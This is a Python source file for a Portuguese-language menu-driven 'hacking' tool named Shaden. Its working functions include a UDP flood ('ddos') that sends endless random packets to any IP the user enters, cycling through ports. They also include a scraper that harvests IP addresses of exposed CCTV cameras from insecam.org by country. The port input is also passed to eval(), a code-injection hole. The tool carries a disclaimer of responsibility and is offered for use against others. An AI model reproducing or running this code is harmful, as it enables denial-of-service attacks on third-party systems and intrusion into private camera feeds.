import os
import sys
import urllib.request
import json

# configurações

COLORS = {
    "reset": "\033[0m",
    "gray": "\033[90m",
    "cyan": "\033[96m",
    "magenta": "\033[95m",
    "yellow": "\033[93m",
    "green": "\033[92m",
    "error": "\033[91m",
    "red": "\033[91m",
}

# menu principal
MENU_STRUCTURE = {
    "Network": ["[01]- My IP", "[02]-", "[03]-", "[04]-", "[05]-", "[06]-"],
    "Hacking": ["[07]- CCTV", "[08]- DDoS", "[09]-", "[10]-", "[11]-", "[12]-"],
    "Utilities": ["[13]-", "[14]-", "[15]-", "[16]-", "[17]-", "[18]-"],
    "</none>": ["[N]", "[N]", "[N]", "[N]", "[N]", "[N]"],
    "</none_2>": ["[N]", "[N]", "[N]", "[N]", "[N]", "[N]"],
    "</none_3>": ["[N]", "[N]", "[N]", "[N]", "[N]", "[N]"],
}

# comandos
COMMANDS = {"01": "ip", "07": "cctv", "08": "ddos"}

# visual


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    banner_lines = [
        "███████╗██╗  ██╗ █████╗ ██████╗ ███████╗███╗   ██╗",
        "██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝████╗  ██║",
        "███████╗███████║███████║██║  ██║█████╗  ██╔██╗ ██║",
        "╚════██║██╔══██║██╔══██║██║  ██║██╔══╝  ██║╚██╗██║",
        "███████║██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║",
        "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝",
    ]
    gradient = [
        "\033[38;5;85m",
        "\033[38;5;84m",
        "\033[38;5;120m",
        "\033[38;5;156m",
        "\033[38;5;183m",
        "\033[38;5;177m",
    ]
    print()
    for i, line in enumerate(banner_lines):
        print(gradient[i % len(gradient)] + line + COLORS["reset"])
    print(COLORS["cyan"] + " " * 20 + "by y4fw" + COLORS["reset"] + "\n")


def print_separator():
    return "─" * 25


def print_menu(page):
    sep = print_separator()

    # atalhos
    print(
        f"{COLORS['yellow']}[H]-Ajuda{COLORS['reset']}"
        f"{' ' * 15}"
        f"{COLORS['yellow']}[N]-Próximo/Voltar{COLORS['reset']}"
        f"{' ' * 15}"
        f"{COLORS['red']}[Exit]-Sair{COLORS['reset']}\n"
    )

    categories = list(MENU_STRUCTURE.keys())
    pages = [categories[i : i + 3] for i in range(0, len(categories), 3)]
    current_cats = pages[page]

    # cabeçalho
    header = (
        f"    {COLORS['cyan']}"
        + f"{COLORS['reset']} {sep} {COLORS['cyan']}".join(current_cats)
        + COLORS["reset"]
    )
    print(header + "\n")

    # máximo de itens
    max_items = max(len(MENU_STRUCTURE[c]) for c in current_cats)

    # linhas do menu
    for i in range(max_items):
        linha = "    "
        for idx, cat in enumerate(current_cats):
            item = MENU_STRUCTURE[cat][i] if i < len(MENU_STRUCTURE[cat]) else ""
            linha += f"{COLORS['magenta']}{item:<25}{COLORS['reset']}"
            if idx < len(current_cats) - 1:
                linha += f"{COLORS['gray']}│{COLORS['reset']} "
        print(linha)

    print(f"\n{COLORS['green']}Página {page+1}/{len(pages)}{COLORS['reset']}")


def print_prompt():
    print(f"\n{COLORS['gray']}{'─' * 70}{COLORS['reset']}")
    print(
        f"\n{COLORS['green']}┌─({COLORS['cyan']}hacker{COLORS['green']}@{COLORS['magenta']}shaden{COLORS['green']})-[{COLORS['cyan']}~{COLORS['green']}]"
    )
    print(f"└─$ {COLORS['reset']}", end="")


def lolinput():
    print(f"\n{COLORS['gray']}{'─' * 70}{COLORS['reset']}")
    print(
        f"\n{COLORS['green']}┌─({COLORS['cyan']}hacker{COLORS['green']}@{COLORS['magenta']}shaden{COLORS['green']})-[{COLORS['cyan']}~{COLORS['green']}]"
    )
    return input(f"└─$ {COLORS['reset']}")


# commands functions


def get_public_ip():
    try:
        with urllib.request.urlopen(
            "https://api.ipify.org?format=json", timeout=5
        ) as res:
            data = json.load(res)
            return data.get("ip", "desconhecido")
    except:
        return "erro ao obter IP"


def cctv():
    os.system("cls" if os.name == "nt" else "clear")

    import requests
    import re

    print_banner()
    print(
        f"{COLORS['yellow']}[NOTA]{COLORS['reset']} Não me responsabilizo pelos usos, use com sua conta em risco."
    )
    print(f"{COLORS['yellow']}Please Select a Country{COLORS['reset']}")

    countries = [
        "Russian Federation",
        "United States",
        "Japan",
        "Canada",
        "New Zealand",
        "Ukraine",
        "Germany",
        "Austria",
        "Spain",
        "Turkey",
        "Hong Kong",
        "Greece",
        "Portugal",
        "Singapore",
        "Colombia",
    ]

    for i, country in enumerate(countries, 1):
        print(f"{COLORS['cyan']}[{i}]{COLORS['reset']} {country}")

    num = int(lolinput())
    if num not in range(1, len(countries) + 1):
        print(
            f"\n{COLORS['error']}[ERROR]{COLORS['reset']} opção {num} não encontrada!"
        )
        return

    country_codes = {
        1: "RU",
        2: "US",
        3: "JP",
        4: "CA",
        5: "NZ",
        6: "UK",
        7: "DE",
        8: "AT",
        9: "ES",
        10: "TR",
        11: "HK",
        12: "GR",
        13: "PT",
        14: "SG",
        15: "CO",
    }

    max_pages = {
        1: 82,
        2: 720,
        3: 232,
        4: 38,
        5: 5,
        6: 2,
        7: 107,
        8: 48,
        9: 39,
        10: 54,
        11: 7,
        12: 8,
        13: 7,
        14: 7,
        15: 6,
    }

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"
        }
        code = country_codes[num]
        pages = max_pages[num]

        for page in range(1, pages + 1):
            url = f"http://www.insecam.org/en/bycountry/{code}/?page={page}"
            res = requests.get(url, headers=headers)
            findip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", res.text)

            for ip in findip:
                print(f"{COLORS['yellow']}Ip: {ip}{COLORS['reset']}")
                print(
                    f"\n{COLORS['yellow']}[WARN]{COLORS['reset']} se nenhum IP foi encontrado, o sistema não conseguiu encontrar câmeras vulneraveis!"
                )

    except Exception as e:
        print(f"fckbi, deu erro: {e}")


def ddos():
    import socket
    import random
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    os.system("cls" if os.name == "nt" else "clear")
    
    print_banner()
    print(f"{COLORS['yellow']}[NOTA]{COLORS['reset']} Não me responsabilizo pelos usos, use com sua conta em risco.")
    print(f"{COLORS['yellow']}[NOTA]{COLORS['reset']} Utilize CTRL+C para finalizar.")
    
    ip = input(f"{COLORS['yellow']}Ip Target: {COLORS['reset']}")
    port = eval(input(f"{COLORS['yellow']}Port: {COLORS['reset']}"))
    
    os.system("cls" if os.name == "nt" else "clear")
    print_banner()
    
    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1
    
    
def show_help():
    print(f"\n{COLORS['yellow']}[HELP]{COLORS['reset']} comandos disponíveis:\n")
    print("  [N] - ir para próxima página do menu")
    print("  [H] - mostrar esta ajuda")
    print("  [Exit] - sair do programa\n")
    print("  ferramentas disponíveis:")
    for k, v in COMMANDS.items():
        print(f"   {k}: {v}")
    print()


# lógica


def handle_command(choice, page_count, current_page):
    choice = choice.lower()

    if choice == "n":
        return (current_page + 1) % page_count

    elif choice == "h":
        clear_screen()
        print_banner()
        show_help()
        input("pressione ENTER pra voltar...")
        return current_page

    elif choice in COMMANDS:
        action = COMMANDS[choice]
        if action == "ip":
            ip = get_public_ip()
            print(f"\n{COLORS['cyan']}[*]{COLORS['reset']} Seu IP público é: {ip}")
        elif action == "cctv":
            cctv()
        elif action == "ddos":
            ddos()
        else:
            print(f"\n{COLORS['cyan']}[*]{COLORS['reset']} {action}")
        input("\npressione ENTER pra continuar...")
        return current_page

    elif choice in ("exit", "quit"):
        print(f"\n{COLORS['error']}[!]{COLORS['reset']} Saindo...")
        sys.exit(0)

    else:
        print(
            f"\n{COLORS['error']}[ERROR]{COLORS['reset']} opção '{choice}' não encontrada"
        )
        input("\npressione ENTER pra continuar...")
        return current_page


def main():
    current_page = 0
    categories = list(MENU_STRUCTURE.keys())
    page_count = (len(categories) + 2) // 3  # 3 categorias por página

    while True:
        clear_screen()
        print_banner()
        print_menu(current_page)
        print_prompt()
        choice = input().strip()
        current_page = handle_command(choice, page_count, current_page)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{COLORS['error']}[!]{COLORS['reset']} Programa interrompido")
        sys.exit(0)
